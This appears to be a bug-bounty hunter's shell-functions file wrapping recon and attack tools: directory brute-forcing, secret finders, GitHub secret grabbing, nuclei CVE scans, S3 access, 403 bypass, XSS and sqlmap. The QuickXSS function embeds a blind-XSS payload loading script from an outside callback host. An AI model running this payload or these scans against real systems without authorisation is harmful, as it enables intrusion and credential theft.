#Dirsearch
dirsearch(){
	sudo python3 ~/tools/dirsearch/dirsearch.py -d $1 
}


#SecretFinder - just add file name
secretfinder(){
	sudo python3 ~/tools/SecretFinder.py -i $1 -e
}


#SecScraper - just add type (hackerone or medium) and topic 
secscraper(){
	sudo python3 ~/tools/SecScraper/scraper.py -t $1 -q "$2" -c 20 -o ~/Desktop/$2.txt
} 


#gitGaber - just add keywords and url 
gitGaber(){
	sudo python3 ~/toosls/gitGraber/gitGraber.py -k $2 -q $1 -s 
}


#nucleiCVE - add url.txt 
nucleicve(){
	sudo nuclei -l $1 -t cves/
}

awsls(){
	aws s3 ls s3://$1
}

awscp(){
	aws s3 cp $2 s3://$1
}

#JSFScan - only add target name and output file name
jsfscan(){
	sudo bash ~/tools/JSFScan/JSFScan.sh -l $1 --all -r -o ~/$2
}

#Byp4xx - just add url
byp4xx(){
	sudo bash ~/tools/byp4xx/byp4xx.sh -c $1
}

#webdork - just add company name annd output file 
gdork(){
	sudo webdork -cn $1 -bw --show -v -o ~/$2
}

#QuickXSS - just add target.com and output filename
quickxss(){
	sudo bash ~/tools/QuickXSS/QuickXSS.sh -d $1 -b <script src=https://cryptopekkaa.xss.ht></script> -o 	~/$2
}

#sqlmap - add every thing 
sqlmap(){
	sudo python ~/tools/sqlmap/sqlmap.py
}

